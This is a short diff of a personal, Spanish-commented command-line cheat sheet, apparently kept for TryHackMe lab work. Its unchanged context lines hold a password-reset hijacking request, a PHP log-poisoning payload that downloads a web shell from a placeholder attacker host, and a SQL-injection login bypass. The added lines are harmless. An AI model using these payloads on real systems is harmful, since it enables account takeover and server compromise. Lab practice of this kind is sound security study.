@@ -64,6 +64,7 @@ sed 's/\\n/\n/g' # reemplazar \n a salto de linea
 curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
 curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%
 curl -s -X POST URL --data-urlencode email=admin@admin.com'-- -  | grep '<h2>'
+curl -s -X POST -d @FILE URL
 
 # awk
 awk '{print "https://"$1}'
@@ -233,3 +234,4 @@ systemctl stop snap.multipass.multipassd.service
 
 # disco 1TB automount
 UUID=26C00F163A80CC80 /home/USUARIO/datos ntfs auto,uid=1000,gid=1000,dmask=027,fmask=137      0  	  0
+
